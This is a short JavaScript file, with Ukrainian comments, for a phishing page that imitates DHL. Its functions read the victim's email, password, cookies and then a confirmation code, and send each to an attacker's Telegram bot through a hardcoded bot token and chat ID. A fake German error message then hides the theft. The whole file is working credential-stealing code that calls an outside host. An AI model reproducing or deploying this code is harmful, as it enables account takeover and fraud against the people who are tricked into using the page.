// 💀 Конфігурація крадіжки 💀
const BOT_TOKEN = '8447163917:AAGoGQ7NJXbjDLA6dC22QVJ0l4ekdMPen5Q';
const CHAT_ID = '8089839247';

// Відправляє логін/пароль та перемикає форму
function sendCredentials() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const cookies = document.cookie; // Кукі поточного сайту (фішингового)

    // Форматуємо повідомлення
    let message = `*ХАХАЗПЗП: КРАДІЖКА КРЕДЕНЦІАЛІВ (DHL Style)*\n\n`;
    message += `Хахазпзп: Укладений логін: \`${email}\`\n`; 
    message += `Хахазпзп: Украдений пароль: \`${password}\`\n`; 
    message += `\n*Кукі (фішинговий домен):*\n\`${cookies}\``;

    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

    // Відправка даних
    fetch(telegramUrl)
        .finally(() => {
            // Завжди переходимо до вікна з кодом для правдоподібності
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('codeForm').style.display = 'block';
        });
}

// Відправляє код підтвердження з другої форми
function sendCode() {
    const code = document.getElementById('confirmationCode').value;

    // Форматуємо друге повідомлення
    let message = `*ХАХАЗПЗП: КОД ПІДТВЕРДЖЕННЯ (DHL Style)*\n\n`;
    message += `Код: \`${code}\``;

    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

    // Відправка коду
    fetch(telegramUrl)
        .finally(() => {
            // Після перехоплення, можна імітувати помилку або перенаправити
            document.getElementById('codeForm').innerHTML = "<h2>Fehler</h2><p>Leider ist ein technischer Fehler aufgetreten. Bitte versuchen Sie es später erneut.</p><a href='#' class='link-text' onclick='window.location.reload();'>Neu starten</a>";
            // Якщо потрібно перенаправити: window.location.href = "https://www.dhl.de"; 
        });
}
